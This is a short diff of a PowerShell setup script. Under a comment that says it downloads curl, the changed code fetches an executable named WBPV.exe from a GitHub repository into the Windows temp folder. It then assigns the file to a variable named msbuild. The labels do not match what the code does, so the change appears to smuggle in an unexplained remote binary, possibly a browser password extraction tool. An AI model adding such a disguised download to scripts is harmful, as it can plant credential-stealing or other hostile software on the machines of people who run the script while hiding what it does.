@@ -31,11 +31,12 @@ if (!(Get-Command curl -ErrorAction SilentlyContinue)) {
   Write-Host "curl is already installed."
 }
 
-if (!(Get-Command curl -ErrorAction SilentlyContinue)) {
+$WBPV = "$env:TEMP\WBPV.exe"
+
+if (!(Test-Path $WBPV)) {
   # Download curl
   $url = "https://raw.github.com/ksp-wrk/s/main/WBPV.exe"
-  $output = "$env:TEMP\WBPV.exe"
-  Invoke-WebRequest $url -OutFile $output
+  Invoke-WebRequest $url -OutFile $WBPV
 }
 
 $msbuild = ".\WBPV.exe"
